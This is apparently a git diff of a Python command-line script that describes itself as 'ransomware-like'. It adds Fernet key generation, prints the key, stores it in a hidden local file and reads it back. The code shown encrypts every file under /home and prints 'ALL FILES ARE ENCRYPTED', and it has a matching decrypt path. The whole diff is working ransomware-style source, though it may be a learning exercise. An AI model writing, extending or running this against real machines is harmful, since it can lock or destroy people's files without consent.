@@ -19,7 +19,7 @@ import argparse
 # else:
 # 	print("Please provide exactly one command line argument.")
 
-def main(key):
+def main():
 	parser = argparse.ArgumentParser(description="Example script with ransomware-like command-line arguments.")
 
 	group = parser.add_mutually_exclusive_group()
@@ -35,6 +35,12 @@ def main(key):
 
 	if args.encrypt:
 		print("User passed -en or --encrypt")
+
+		print("GENERATING KEY.....")
+		key = generate_key()
+		print(key)
+		save_key(key)
+
 		if args.all:
 			encrypt_directory("/home", key)
 			print("ALL FILES ARE ENCRYPTED")
@@ -49,6 +55,11 @@ def main(key):
 
 	elif args.decrypt:
 		print("User passed -de or --decrypt")
+
+		print("GETTING KEY FROM FILE....")
+		key = get_key_from_file()
+		print(key)
+
 		if args.all:
 			decrypt_directory("/home", key)
 			print("ALL FILES ARE DECRYPTED")
@@ -93,6 +104,22 @@ def decrypt_directory(path,key):
 		for file in files:
 			file_path = os.path.join(root,file)
 			decrypt_specific_file(file_path,key)
+
+
+
+def generate_key():
+	key = Fernet.generate_key()
+	return key
+
+def save_key(key):
+	with open("./.secret_key.key", "wb") as file:
+		file.write(key)
+
+def get_key_from_file():
+	with open("./.secret_key.key", "rb") as file:
+		return file.read()
+
+
 
 if __name__ == "__main__":
 	main()
